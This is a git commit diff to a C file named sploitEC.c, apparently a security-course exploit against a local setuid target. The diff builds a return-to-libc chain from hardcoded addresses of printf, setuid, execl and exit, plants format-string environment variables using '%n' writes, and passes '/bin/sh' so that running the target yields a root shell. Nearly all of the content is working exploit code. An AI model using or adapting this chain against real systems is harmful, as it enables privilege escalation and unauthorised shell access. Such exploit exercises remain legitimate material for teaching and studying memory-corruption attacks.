1daf08f1fbaf510c3eead99f9ccdc95246956c1e
Adam Levin <awl44@me.com>
2019-12-02 17:57:04 -0500

    lllllllllesgo

--- sploits/sploitEC.c
+++ sploits/sploitEC.c
@@ -14,34 +14,44 @@ int main(void)
 
   // printf 0xb7e52670
   // RET 0x0804855b
-  // envvar1 0xbfffffa2
+  // envvar1 0xbfffffd9
+  // printf 0xb7e52670
+  // RET 0x0804855b
+  // envvar2 0xbfffffe0
+  // setuid 0xb7eba2e0
+  // placeholder1 0xbffffe20
   // execl 0xb7eb9a80
   // exit 0xb7e379d0
-  // envvar2 0xbfffffb1
-  // address 0xbffffdec
+  // envvar3 0xbfffffe7
+  // placeholder2 0xbffffe34
 
-  char *result = malloc(41);
-  strcat(result, "AAAAAAAA");
-  strcat(result, "\x70\x26\xe5\xb7");
-  strcat(result, "\x5b\x85\x04\x08");
-  strcat(result, "\xa2\xff\xff\xbf");
-  strcat(result, "\x80\x9a\xeb\xb7");
-  strcat(result, "\xd0\x79\xe3\xb7");
-  strcat(result, "\xb1\xff\xff\xbf");
-  strcat(result, "\xb1\xff\xff\xbf");
-  strcat(result, "\xec\xfd\xff\xbf");
+  char *result = malloc(8+14*4+1);
+  strcat(result, "AAAAAAAA"); // stuff
+  strcat(result, "\x70\x26\xe5\xb7"); // printf
+  strcat(result, "\x5b\x85\x04\x08"); // ret
+  strcat(result, "\xd9\xff\xff\xbf"); // envar1
+  strcat(result, "\x70\x26\xe5\xb7"); // printf
+  strcat(result, "\x5b\x85\x04\x08"); // ret
+  strcat(result, "\xe0\xff\xff\xbf"); // envar2
+  strcat(result, "\xe0\xa2\xeb\xb7"); // setuid
+  strcat(result, "\x5b\x85\x04\x08"); // ret
+  strcat(result, "\x20\xfe\xff\xbf"); // placeholder1
+  strcat(result, "\x80\x9a\xeb\xb7"); // execl
+  strcat(result, "\xd0\x79\xe3\xb7"); // exit
+  strcat(result, "\xe7\xff\xff\xbf"); // envar3
+  strcat(result, "\xe7\xff\xff\xbf"); // envar3
+  strcat(result, "\x34\xfe\xff\xbf"); // placeholder2
 
   args[0] = TARGET;
   args[1] = result; 
   args[2] = NULL;
-
-  char *envvar1 = "thing=%5$n";
-  char *envvar2 = "shellcode=/bin/sh";
   
-  char *envp[] =
+  char *envp[4] =
     {
-        envvar1,
-        envvar2
+        "t=%6$n",
+        "j=%8$n",
+        "s=/bin/sh",
+        NULL
     };
 
   execve(TARGET, args, envp);
